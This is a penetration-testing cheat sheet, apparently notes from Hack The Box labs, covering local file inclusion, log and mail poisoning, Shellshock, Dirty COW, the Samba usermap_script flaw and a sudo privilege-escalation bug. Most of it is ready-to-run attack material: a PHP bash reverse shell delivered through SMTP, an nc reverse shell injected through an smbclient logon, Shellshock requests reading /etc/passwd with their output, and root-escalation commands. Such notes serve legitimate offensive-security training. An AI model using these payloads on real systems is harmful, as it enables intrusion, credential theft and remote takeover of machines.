# Local File Inclusion (LFI)
## Example
* assume website provides functionality to view files
* if not properly sanitized input like ``../../../../../etc/passwd`` may be possible

## Using phpfilter
```
http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
```

## PHPInfo LFI
* see https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
* basic idea: race condition due to saving request (multipart) in file under /tmp/XYZ
* the filename can be found in the phpinfo page under variables
* the request should be as big as possible to increase processing time to win the race
* if you are able to browse/access this file before it gets deleted you have RCE

## LFI + SMPT Reverse Shell
* assume you have local file inclusion like:
```
GET //vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action HTTP/1.1
```
* additionally assume SMTP Port (25) is open
```
# connect
$> telnet 10.10.10.7 25
Trying 10.10.10.7...
Connected to 10.10.10.7.
Escape character is '^]'.

# wait for prompt
220 beep.localdomain ESMTP Postfix

# if enhanced
EHLO asdf

# if not
HELO asdf

# verify receipient
VRFY fanis@localhost
252 2.0.0 fanis@localhost # if exist
550 5.1.1 <asdf>: Recipient address rejected: User unknown in local recipient table # if not

# send mail with payload
mail from: manu@manu.ch
250 2.1.0 Ok
rcpt to: fanis@localhost
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system("/bin/bash -i >& /dev/tcp/10.10.14.4/3141 0>&1"); ?>

.
250 2.0.0 Ok: queued as E2517D92FD

```
* setup listener and send request to:
```
/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/fanis%00&module=Accounts&action
```

# Log Poisoning
* For this example a LFI is necessary to work
* prerequisite: accessing the http-log file is needed
* since your user agent is logged for example in /var/log/apache2/access.log you have full control
* modify user agent for example to: ``<?php exec("whoami");?>``
* browse to access log of web server

# ShellShock
## CVE-2014-6271
```
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```

## Example from HTB (Shocker)

**Request:**
```
GET /cgi-bin/user.sh HTTP/1.1

Host: 10.10.10.56

User-Agent: () { :;};echo -e "\r\n$(/bin/cat /etc/passwd)"

Connection: close

```

**Response:**
```
HTTP/1.1 200 OK
Date: Tue, 06 Oct 2020 19:40:22 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Content-Type: text/x-sh
Content-Length: 1687

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
.
.
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash

Content-Type: text/plain
Just an uptime test script
 15:40:23 up 15 min,  0 users,  load average: 0.00, 0.00, 0.00

```

# Dirtyc0w Kernel Exploit (Linux)
See https://github.com/firefart/dirtycow
1. Transfer .c file to target
2. compile it with ``gcc -pthread dirty.c -o dirty -lcrypt``
3. execute the binary ``./dirty newpassword``
4. user ``firefart`` is created with root privileges
# CVE-2007-2447 (smb usermap script)
## Example from Lame (HTB)
```
smbclient //10.10.10.3/tmp
smb: \> logon "/=`nohup mkfifo /tmp/manununu; nc 10.10.14.41 2222 0</tmp/manununu | /bin/sh >/tmp/manununu 2>&1; rm /tmp/manununu`"
```

# MS17-010 - CVE-2017-0143 (EternalBlue)
* see https://github.com/k4u5h41/MS17-010_CVE-2017-0143

# Sudo underflow bug (CVE-2019-14287)
```
sudo -u#-1 /bin/bash
```
